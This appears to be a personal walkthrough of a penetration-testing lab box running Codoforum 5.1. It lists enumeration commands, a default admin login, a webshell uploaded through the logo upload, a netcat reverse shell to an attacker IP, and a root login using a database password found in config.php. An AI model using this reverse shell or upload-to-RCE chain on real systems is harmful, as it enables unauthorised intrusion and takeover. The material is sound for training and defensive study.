### Enumeration
```
IP=192.168.158.23
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,80 -A $IP
```
### Ports 
- 22
	- OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
- 80
	- Apache httpd 2.4.41 ((Ubuntu))
	- Codoforum
### Foothold
- 80
	- ![[Pasted image 20240703081303.png]]
	- dirsearch -u http://$IP
		- `/admin  /cache /index.php`
	- /login
		- admin:admin  -  successful
	- /admin
		- login page
		- admin:admin
			- successful
		- codoforum V.5.1.105
			- searchsploit codoforum
				- CodoForum v5.1 - Remote Code Execution (RCE) 50978
				- Tried to use but something went wrong. 
				- Followed this: `admin panel > global settings > change forum logo > upload and access from http://192.168.158.23//sites/default/assets/img/attachments/[file.php])`
				- `http://192.168.158.23/sites/default/assets/img/attachments/webshell.php`
				- Now we have a webshell as www-data
				- `busybox nc 192.168.45.195 8000 -e /bin/bash`
				- Got RCE
### PE
#### Linux
- www-data
	- id
		- uid=33(www-data) gid=33(www-data) groups=33(www-data)
	- sudo -l
		- needs password
	- uname -a
		- `Linux codo 5.4.0-150-generic #167-Ubuntu SMP Mon May 15 17:35:05 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux`
	- getcap -r / 2>/dev/null
		- Nothing
	- suid
		- find / -type f -perm -04000 -ls 2>/dev/null
		- nothing
	- linpeas
		- possible exploits
			- pwnkit
				- did not work
			- setuid screen v4.5.0 LPE
		- users console
			- offsec
			- root
		- /var/www/html/sites/default/config.php
			- mysql - codo:FatPanda123
		- su offsec
			- FatPanda123  -  failed
		- sudo -l
			- FatPanda123
				- failed
			- admin
				- failed
		- su root
			- FatPanda123
			- Successful
		- mysql -u codo -p
			- FatPanda123
			- Successful
			- databases
				- codoforumdb
					- codo_users
				- information_schema
	- Writeable
		- find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
			- /run/screen
				- screen -v
					- 4.08
### Lessons Learned
- Try found passwords on all accounts with console